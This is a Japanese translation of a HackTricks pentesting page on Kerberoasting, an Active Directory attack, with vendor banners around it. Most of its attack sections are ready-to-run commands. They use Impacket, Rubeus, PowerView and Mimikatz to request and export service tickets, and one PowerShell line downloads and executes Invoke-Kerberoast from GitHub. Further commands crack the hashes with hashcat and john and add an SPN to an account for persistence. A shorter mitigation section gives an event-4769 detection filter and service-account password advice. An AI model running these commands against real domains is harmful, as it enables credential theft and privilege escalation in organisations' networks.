# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度な**コミュニティツールによって**強化された** **ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでのAWSハッキング**を学びましょう！</summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つけてください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)を**フォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、**あなたのハッキングトリックを共有**してください。

</details>

## Kerberoast

Kerberoastingは、特に**Active Directory（AD）**内の**ユーザーアカウント**で動作するサービスに関連する**TGSチケット**の取得に焦点を当てています。これには**コンピューターアカウント**は含まれません。これらのチケットの暗号化には、**ユーザーパスワード**から派生したキーが使用され、**オフライン資格情報のクラック**の可能性があります。サービスとしてのユーザーアカウントの使用は、空でない**"ServicePrincipalName"**プロパティによって示されます。

**Kerberoasting**を実行するには、**TGSチケットを要求できるドメインアカウント**が必要です。ただし、このプロセスには**特権が必要**ではなく、**有効なドメイン資格情報**を持つ誰でもアクセスできます。

### キーポイント：

* **Kerberoasting**は、**AD**内の**ユーザーアカウントサービス**向けの**TGSチケット**を対象としています。
* **ユーザーパスワード**からのキーで暗号化されたチケットは、**オフラインでクラック**できます。
* サービスは、空でない**ServicePrincipalName**によって識別されます。
* **特別な特権**は必要ありません。単に**有効なドメイン資格情報**が必要です。

### **攻撃**

{% hint style="warning" %}
**Kerberoastingツール**は通常、攻撃を実行し、TGS-REQリクエストを開始する際に**`RC4暗号化`**を要求します。これは、**RC4が**他の暗号化アルゴリズム（AES-128やAES-256など）よりも**[弱い**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795)ため、Hashcatなどのツールを使用してオフラインで簡単にクラックできます。\
RC4（タイプ23）ハッシュは**`$krb5tgs$23$*`**で始まり、AES-256（タイプ18）は**`$krb5tgs$18$*`**で始まります。
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
### Kerberoastableユーザーのダンプを含む複数の機能を持つツール:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Kerberoast可能なユーザーを列挙する**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **手法1: TGSを要求してメモリからダンプする**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **テクニック2: 自動ツール**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
TGSをリクエストすると、Windowsイベント`4769 - Kerberosサービスチケットが要求されました`が生成されます。
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**できます。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### クラッキング
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### 永続性

ユーザーに**十分な権限**がある場合、それを**Kerberoastable**にすることができます：
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
以下は、**kerberoast** 攻撃に役立つ**ツール**が見つかります: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Linux でこの**エラー**が発生した場合: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**、それはローカル時間の問題です。ホストを DC と同期する必要があります。いくつかのオプションがあります:

* `ntpdate <DCのIP>` - Ubuntu 16.04 以降非推奨
* `rdate -n <DCのIP>`

### 緩和策

Kerberoasting は、悪用可能な場合に高い潜在性で実行される可能性があります。この活動を検出するためには、**Security Event ID 4769** に注意を払う必要があります。これは、Kerberos チケットが要求されたことを示します。ただし、このイベントが頻繁に発生するため、疑わしい活動を分離するために特定のフィルタを適用する必要があります:

* サービス名が **krbtgt** であってはならず、これは通常の要求です。
* **$** で終わるサービス名は除外して、サービスに使用されるマシンアカウントを含めないようにします。
* マシンからの要求は、**machine@domain** という形式のアカウント名を除外することでフィルタリングされるべきです。
* 失敗コードが **'0x0'** で識別される成功したチケット要求のみを考慮すべきです。
* **最も重要なのは**、チケットの暗号化タイプが **0x17** である必要があります。これは、Kerberoasting 攻撃でよく使用されます。
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
## Kerberoastリスクの軽減：

* **サービスアカウントのパスワードが推測困難**であることを確認し、**25文字以上**の長さを推奨します。
* **管理されたサービスアカウント**を利用し、**自動パスワード変更**や**委任されたサービスプリンシパル名（SPN）管理**などの利点を提供し、このような攻撃に対するセキュリティを向上させます。

これらの対策を実施することで、組織はKerberoastingに関連するリスクを大幅に軽減できます。

## ドメインアカウントなしのKerberoast

**2022年9月**に、研究者であるCharlie Clark氏によって新しいシステムの悪用方法が明らかにされ、彼のプラットフォーム[exploit.ph](https://exploit.ph/)を通じて共有されました。この方法では、**KRB\_AS\_REQ**リクエストを介して**サービスチケット（ST）**を取得することが可能であり、これによりいかなるActive Directoryアカウントの制御も必要としません。基本的に、プリンシパルが事前認証を必要としないように設定されている場合、サイバーセキュリティ領域で知られる**AS-REP Roasting攻撃**と似たシナリオが発生し、この特性を利用してリクエストプロセスを操作することができます。具体的には、リクエストの本文内の**sname**属性を変更することで、システムは標準の暗号化されたチケット発行チケット（TGT）ではなく**ST**を発行するように騙されます。

この技術についての詳細は、この記事で完全に説明されています：[Semperisブログ投稿](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)。

{% hint style="warning" %}
この技術を使用してLDAPをクエリするための有効なアカウントがないため、ユーザーのリストを提供する必要があります。
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## 参考文献

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローする。**
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによってパワードされた**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
